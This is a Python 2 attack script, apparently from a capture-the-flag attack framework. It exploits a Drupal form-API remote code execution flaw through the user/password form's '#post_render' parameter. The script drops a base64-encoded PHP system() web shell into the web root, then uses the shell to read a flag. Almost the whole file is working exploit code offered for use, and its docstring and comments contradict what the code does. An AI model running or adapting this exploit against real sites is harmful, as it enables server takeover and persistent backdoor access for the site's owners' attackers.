#!/usr/bin/env python
# -*- coding: utf-8 -*- 

import requests,re
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
import requests
import hashlib 
import time
import re
import os
import sys
from urllib import quote
import base64

reload(sys)  
sys.setdefaultencoding('utf8')

def vulnerable_attack(target,target_port,cmd):
		
	'''
	this is the payload script for vuln:

	echo file_get_contents($_POST[444]);

	'''

	try:
		cmd = flag_path
		#res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
		res = shit(target,target_port,cmd)
		# Even though we can not execute the cmd with the vuln, but we can read flag
		# and we want to use our framework to carry out this attack
		# not do the replicate tasks to code a new script
		if len(res) == 32:
			res = cmd_prefix + res + cmd_postfix
	except Exception,e:
		debug_print(traceback.format_exc())     
		dump_error("attack failed",target,"vulnerable attack")
		res = "error"

	return res



def shit(ip,port,cmd):

	### config ####



	################

	my_socket = ip + ':' + str(port)
	my_time_hash = '_' + hashlib.md5('xxxx' + str(ip) + str(port) + str(time.time())).hexdigest()
	# my_time_hash = '_' + hashlib.md5('xxxx' + str(ip) + str(port) + str(666)).hexdigest()

	my_shell = "<?php system($_REQUEST['%s']);?>" %(my_time_hash)

	base64_shell = base64.b64encode(my_shell)

	my_shell_cmd = 'echo %s|base64 -d|cat>/var/www/html/1.php' % base64_shell
	session = requests.Session()

	print 'my hash => ' + my_time_hash

	url = 'http://' + my_socket + '/?q=user/password&name[%23post_render][]=exec&name[%23type]=markup&name[%23markup]=' + quote(my_shell_cmd)
	payload = "form_id=user_pass&_triggering_element_name=name"
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}

	tmp = session.post(url,data=payload,headers=headers,timeout=3)
	value = ''
	if tmp.status_code == 200:
		content = str(tmp.content.decode("utf-8"))
		lines = content.split("\n")
		for line in lines:
			if "type=\"hidden\" name=\"form_build_id\"" in line:
				match = re.search('value="(.*)"', line)
				value = match.group(1)
				break
	if not value:
		return 
	url = 'http://' + my_socket + '/?q=file/ajax/name/%23value/' + value
	payload = {'form_build_id': value}

	print 'form_id => ' + value

	session.post(url,data=payload,headers=headers,timeout=3)

	url = 'http://%s/1.php'%my_socket
	payload = {my_time_hash:cmd}

	res = session.post(url,data=payload).content
	print res
	return res










